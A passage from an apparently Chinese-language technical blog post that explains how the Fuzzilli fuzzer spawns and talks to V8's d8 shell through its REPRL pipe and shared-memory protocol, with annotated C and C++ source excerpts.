child</code>）：<ul><li>父进程写入控制消息，子进程读取。</li></ul></li></ul></li></ul></blockquote><p>此时创建好了父子进程通信的管道，接下来就是创建子进程了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">reprl_spawn_child</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br>    ...<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br><span class="hljs-comment">// 创建一个子进程</span><br>    <span class="hljs-type">pid_t</span> pid = vfork(); <span class="hljs-comment">// vfork()表示创建专用于执行execute的进程, 以提高效率, 但是execute()之前地址空间都是共享的</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">pid_t</span> pid = fork();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 子进程</span><br>        <span class="hljs-comment">// 把控制信道和数据信道的fd重定向到子进程特定的读写fd上</span><br>        <span class="hljs-keyword">if</span> (dup2(cwpipe[<span class="hljs-number">0</span>], REPRL_CHILD_CTRL_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(crpipe[<span class="hljs-number">1</span>], REPRL_CHILD_CTRL_OUT) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_out-&gt;fd, REPRL_CHILD_DATA_IN) &lt; <span class="hljs-number">0</span> ||<br>            dup2(ctx-&gt;data_in-&gt;fd, REPRL_CHILD_DATA_OUT) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 failed in the child: %s\n&quot;</span>, strerror(errno));<br>            _exit(<span class="hljs-number">-1</span>);<br>        &#125;<br>...<br>        <span class="hljs-comment">// 关闭管道无用的另一端</span><br>        close(cwpipe[<span class="hljs-number">0</span>]);<br>        close(crpipe[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 设置子进程的stdin stdout stderr</span><br>        <span class="hljs-type">int</span> devnull = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>        dup2(devnull, <span class="hljs-number">0</span>);<span class="hljs-comment">// 关闭stdin</span><br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stdout) dup2(ctx-&gt;child_stdout-&gt;fd, <span class="hljs-number">1</span>);<span class="hljs-comment">// 根据条件是否关闭stdout 和 stderr</span><br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (ctx-&gt;child_stderr) dup2(ctx-&gt;child_stderr-&gt;fd, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">else</span> dup2(devnull, <span class="hljs-number">2</span>);<br>        close(devnull);<br><br>        <span class="hljs-comment">// 处理stdin stdout stderr，控制管道fd，数据管道fd，然后关闭剩余所有的fd</span><br>        <span class="hljs-type">int</span> tablesize = getdtablesize();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt; tablesize; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i == REPRL_CHILD_CTRL_IN || i == REPRL_CHILD_CTRL_OUT || i == REPRL_CHILD_DATA_IN || i == REPRL_CHILD_DATA_OUT) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            close(i);<br>        &#125;<br>        <span class="hljs-comment">// 开始执行js shell</span><br>        execve(ctx-&gt;argv[<span class="hljs-number">0</span>], ctx-&gt;argv, ctx-&gt;envp);<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Failed to execute child process %s: %s\n&quot;</span>, ctx-&gt;argv[<span class="hljs-number">0</span>], strerror(errno));<br>        fflush(<span class="hljs-built_in">stderr</span>);<br>        _exit(<span class="hljs-number">-1</span>);<span class="hljs-comment">// 子进程执行至此则退出</span><br>    &#125;<br>    <span class="hljs-comment">// 以上都是子进程执行的内容*</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是通过系统调用<code>execve()</code>进行执行js shell。后续部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">reprl_spawn_child</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx)</span><br>&#123;<br>    <span class="hljs-comment">// 父进程关闭管道无用的另一端</span><br>    close(crpipe[<span class="hljs-number">1</span>]);<br>    close(cwpipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// 错误处理，fork失败</span><br>        close(ctx-&gt;ctrl_in);<br>        close(ctx-&gt;ctrl_out);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to fork: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    ctx-&gt;pid = pid;<span class="hljs-comment">// 父进程记录子进程的pid</span><br><span class="hljs-comment">// 阻塞等待子进程的HELO，出现</span><br>    <span class="hljs-type">char</span> helo[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (read(ctx-&gt;ctrl_in, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Did not receive HELO message from child: %s&quot;</span>, strerror(errno));<br>    &#125;<br><span class="hljs-comment">// 如果收到的消息不是&quot;HELO&quot;则杀死子进程</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(helo, <span class="hljs-string">&quot;HELO&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Received invalid HELO message from child: %s&quot;</span>, helo);<br>    &#125;<br><span class="hljs-comment">// 向子进程发送HELO作为回复</span><br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send HELO reply message to child: %s&quot;</span>, strerror(errno));<br>    &#125;<br>...<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时，<code>reprl_spawn_child()</code>便已经结束，那么我们回到<code>reprl_execute()</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_length, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    ...<br>    <span class="hljs-comment">// Copy the script to the data channel.</span><br>    <span class="hljs-comment">// 将Script文件写入到共享内存中</span><br>    <span class="hljs-built_in">memcpy</span>(ctx-&gt;data_out-&gt;mapping, script, script_size);<br><br>    <span class="hljs-comment">// Tell child to execute the script.</span><br>    <span class="hljs-comment">// 发送控制信息让子进程执行测试程序</span><br>    <span class="hljs-keyword">if</span> (write(ctx-&gt;ctrl_out, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> ||<span class="hljs-comment">// 执行脚本</span><br>        write(ctx-&gt;ctrl_out, &amp;script_size, <span class="hljs-number">8</span>) != <span class="hljs-number">8</span>) &#123;<span class="hljs-comment">// Script脚本长度的地址写入共享内存</span><br>        <span class="hljs-comment">// These can fail if the child unexpectedly terminated between executions.</span><br>        <span class="hljs-comment">// Check for that here to be able to provide a better error message.</span><br>        <span class="hljs-type">int</span> status;<br>        <span class="hljs-keyword">if</span> (waitpid(ctx-&gt;pid, &amp;status, WNOHANG) == ctx-&gt;pid) &#123;<span class="hljs-comment">// 使用`WNOHANG`进行非阻塞地检查子进程是否已经终止。若终止则返回值为子进程的pid，此处为错误处理，若子进程意外终止，那么进行下面代码执行进行error告知</span><br>            reprl_child_terminated(ctx);<br>            ...<br>        &#125;<br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to send command to child process: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>最后阻塞等待子进程执行完毕，然后通过获取子进程的执行结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reprl_execute</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> reprl_context* ctx, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* script, <span class="hljs-type">uint64_t</span> script_length, <span class="hljs-type">uint64_t</span> timeout, <span class="hljs-type">uint64_t</span>* execution_time, <span class="hljs-type">int</span> fresh_instance)</span><br>&#123;<br>    ...<br>    <span class="hljs-comment">// Wait for child to finish execution (or crash).</span><br>    <span class="hljs-comment">// // 等待子进程执行完毕或者crash</span><br>    <span class="hljs-type">uint64_t</span> start_time = current_usecs();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123;.fd = ctx-&gt;ctrl_in, .events = POLLIN, .revents = <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, timeout_ms);<span class="hljs-comment">// 阻塞等待控制信道的信息，最多等待timeout_ms</span><br>    *execution_time = current_usecs() - start_time;<span class="hljs-comment">// 计算执行耗时</span><br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// poll返回0说明执行超时了</span><br>        <span class="hljs-comment">// kill子进程, 然后返回超时的状态</span><br>        reprl_terminate_child(ctx);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">// 不是1说明poll出错了</span><br>        <span class="hljs-keyword">return</span> reprl_error(ctx, <span class="hljs-string">&quot;Failed to poll: %s&quot;</span>, strerror(errno));<br>    &#125;<br>    <br>    <span class="hljs-comment">// Poll succeeded, so there must be something to read now (either the status or EOF).</span><br>    <span class="hljs-comment">// poll成功后, 通过控制管道获取子进程的输出的执行状态</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">ssize_t</span> rv = read(ctx-&gt;ctrl_in, &amp;status, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        ...<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rv != <span class="hljs-number">4</span>) &#123;<br>       <span class="hljs-comment">// 错误处理</span><br>        ...<br>    &#125;<br>    <span class="hljs-comment">// The status must be a positive number, see the status encoding format below.</span><br>    <span class="hljs-comment">// We also don&#x27;t allow the child process to indicate a timeout. If we wanted,</span><br>    <span class="hljs-comment">// we could treat it as an error if the upper bits are set.</span><br>    <span class="hljs-comment">// 返回子进程输出的执行状态, 之后子进程会重置状态做好下一次执行的准备</span><br>    status &amp;= <span class="hljs-number">0xffff</span>;<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>在一次执行结束后, 子进程会重置js引擎的状态为下一次执行做准备, 我们可以看到相较于fork server不仅免去了js引擎初始化的开销, 还面去了fork系统调用的开销, fork的开销。此外由于父进程会阻塞等待子进程执行, 父子进程不可能同时执行, 因此一个Fuzzer对象在某一时刻只会占用一个线程。</p><h4 id="v8-fuzzilli-true-1"><a href="#v8-fuzzilli-true-1" class="headerlink" title="v8_fuzzilli&#x3D;true"></a>v8_fuzzilli&#x3D;true</h4><p>关于v8的编译脚本参数分析中，存在一个参数：<code>v8_fuzzilli=true</code>，它除了会添加一些回调函数（前文已经分析过），还会增加对Reprl的支持。主要影响了<code>v8/v8/src/d8/d8.cc</code>，该文件是<code>d8</code>的入口，从头开始分析：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/fuzzilli/cov.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/fuzzilli/fuzzilli.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  <span class="hljs-comment">// V8_FUZZILLI</span></span><br></code></pre></td></tr></table></figure><p>首先会include先前提及的回调函数的文件。然后再设置一个全局变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br><span class="hljs-type">bool</span> fuzzilli_reprl = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">bool</span> fuzzilli_reprl = <span class="hljs-literal">false</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  <span class="hljs-comment">// V8_FUZZILLI</span></span><br></code></pre></td></tr></table></figure><p>接着来到<code>d8</code>的入口函数<code>int Shell::Main(int argc, char* argv[])</code>处：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Shell::Main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>  <span class="hljs-comment">// 引擎初始化相关工作</span><br>  v8::V8::<span class="hljs-built_in">InitializeICUDefaultLocation</span>(argv[<span class="hljs-number">0</span>], options.icu_data_file);<br>  v8::V8::<span class="hljs-built_in">Initialize</span>();<br>  Isolate* isolate = Isolate::<span class="hljs-built_in">New</span>(create_params);<br><br>    ...<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br>  <span class="hljs-comment">// Let the parent process (Fuzzilli) know we are ready.</span><br>  <span class="hljs-keyword">if</span> (options.fuzzilli_enable_builtins_coverage) &#123;<br>    ...<br>  &#125;<br>  <span class="hljs-comment">// 向Fuzzer发送HELO并等待回复</span><br>  <span class="hljs-type">char</span> helo[] = <span class="hljs-string">&quot;HELO&quot;</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">write</span>(REPRL_CWFD, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> || <span class="hljs-built_in">read</span>(REPRL_CRFD, helo, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span>) &#123;<br>    fuzzilli_reprl = <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(helo, <span class="hljs-string">&quot;HELO&quot;</span>, <span class="hljs-number">4</span>) != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">FATAL</span>(<span class="hljs-string">&quot;REPRL: Invalid response from parent&quot;</span>);<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  <span class="hljs-comment">// V8_FUZZILLI</span></span><br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来进入<code>fuzzilli_reprl</code>的执行循环，那么对于fuzzilli的reprl来说：</p><ol><li>会等待父进程的<code>exec</code>信号；</li><li>然后调用<code>RunMain()</code>获取和执行测试程序并重置执行环境</li><li>最后获取结果，通过控制管道将结果传输到Fuzzer中，并重置收集覆盖率信息的共享内存</li><li>然后重复上述步骤</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Shell::Main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    ... <br>    <span class="hljs-keyword">do</span>  <span class="hljs-comment">// fuzzilli_reprl执行循环</span><br>    &#123;<br>        <span class="hljs-comment">// 等待父进程的exec信号</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br>        <span class="hljs-keyword">if</span> (fuzzilli_reprl) &#123;<br>            <span class="hljs-type">unsigned</span> action = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">ssize_t</span> nread = <span class="hljs-built_in">read</span>(REPRL_CRFD, &amp;action, <span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">if</span> (nread != <span class="hljs-number">4</span> || action != <span class="hljs-string">&#x27;cexe&#x27;</span>) &#123;<br>                <span class="hljs-built_in">FATAL</span>(<span class="hljs-string">&quot;REPRL: Unknown action: %u&quot;</span>, action);<br>            &#125;<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// V8_FUZZILLI</span></span><br><br>        result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i::v8_flags.stress_runs &gt; <span class="hljs-number">0</span>) &#123;<br>            ...<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.code_cache_options != ShellOptions::kNoProduceCache) &#123;<br>            ...<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">bool</span> last_run = <span class="hljs-literal">true</span>;<br>            result = <span class="hljs-built_in">RunMain</span>(isolate, last_run);    <span class="hljs-comment">// 获取脚本并执行</span><br>        &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> V8_FUZZILLI</span><br>        <span class="hljs-keyword">if</span> (fuzzilli_reprl) &#123;<br>            <span class="hljs-comment">// 获取执行结果</span><br>            <span class="hljs-type">int</span> status = result &lt;&lt; <span class="hljs-number">8</span>;<br>            std::vector&lt;<span class="hljs-type">bool</span>&gt; bitmap;<br>            <span class="hljs-keyword">if</span> (options.fuzzilli_enable_builtins_coverage) &#123;<br>                ...<br>            &#125;<br>            <span class="hljs-keyword">if</span> (options.fuzzilli_coverage_statistics) &#123;<br>                ...<br>            &#125;<br>            <span class="hljs-comment">// 把执行结果通过管道返回给Fuzzilli</span><br>            <span class="hljs-built_in">fflush</span>(stdout);<br>            <span class="hljs-built_in">fflush</span>(stderr);<br>            <span class="hljs-built_in">CHECK_EQ</span>(<span class="hljs-built_in">write</span>(REPRL_CWFD, &amp;status, <span class="hljs-number">4</span>), <span class="hljs-number">4</span>);<br>            <span class="hljs-comment">// 重置edge guard段</span><br>            <span class="hljs-built_in">sanitizer_cov_reset_edgeguards</span>();<br>            <span class="hljs-keyword">if</span> (options.fuzzilli_enable_builtins_coverage) &#123;<br>                ...<br>            &#125;<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// V8_FUZZILLI</span></span><br>    &#125;<br>    <span class="hljs-keyword">while</span> (fuzzilli_reprl);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Shell::RunMain()</code>会调用<code>RunMainIsolate()</code>方法在主Isolate上执行脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Shell::RunMain</span><span class="hljs-params">(v8::Isolate* isolate, <span class="hljs-type">bool</span> last_run)</span> </span>&#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(isolate);<br>  ...<br><br>  <span class="hljs-comment">// 判断是否要保留js执行上下文: 如果上一次执行成功了, 并且是交互执行模式, 则保留</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">bool</span> keep_context_alive = last_run &amp;&amp; (<span class="hljs-built_in">use_interactive_shell</span>() || i::v8_flags.stress_snapshot);<br>  <span class="hljs-comment">// 获取一个js脚本并执行</span><br>  <span class="hljs-type">bool</span> success = <span class="hljs-built_in">RunMainIsolate</span>(isolate, keep_context_alive);<br>  <span class="hljs-comment">// 垃圾收集</span><br>  <span class="hljs-built_in">CollectGarbage</span>(isolate);<br>  ...<br>  <span class="hljs-comment">// 如果执行时有异常抛出,则认为执行失败</span><br>  <span class="hljs-keyword">return</span> (success == Shell::options.expected_to_throw ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Shell::RunMainIsolate()</code>会调用<code>SourceGroup::Execute()</code>方法开始在主Isolate上执行js脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Shell::RunMainIsolate</span><span class="hljs-params">(v8::Isolate* isolate, <span class="hljs-type">bool</span> keep_context_alive)</span> </span>&#123;<br>  <span class="hljs-function">HandleScope <span class="hljs-title">scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-comment">// 创建执行上下文</span><br>  Local&lt;Context&gt; context;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateEvaluationContext</span>(isolate).<span class="hljs-built_in">ToLocal</span>(&amp;context)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (keep_context_alive) &#123;<br>    evaluation_context_.<span class="hljs-built_in">Reset</span>(isolate, context);<br>  &#125;<br><br>  <span class="hljs-type">bool</span> success = <span class="hljs-literal">true</span>;<br>  &#123;<br>    <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br>    <span class="hljs-function">InspectorClient <span class="hljs-title">inspector_client</span><span class="hljs-params">(context, options.enable_inspector)</span></span>;<br>    <span class="hljs-function">PerIsolateData::RealmScope <span class="hljs-title">realm_scope</span><span class="hljs-params">(PerIsolateData::Get(isolate))</span></span>;<br>    <span class="hljs-keyword">if</span> (!options.isolate_sources[<span class="hljs-number">0</span>].<span class="hljs-built_in">Execute</span>(isolate)) success = <span class="hljs-literal">false</span>;    <span class="hljs-comment">// 开始执行</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CompleteMessageLoop</span>(isolate)) success = <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-built_in">WriteLcovData</span>(isolate, options.lcov_file);<br>  <span class="hljs-keyword">return</span> success;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后来到<code>d8</code>的<code>Execute()</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 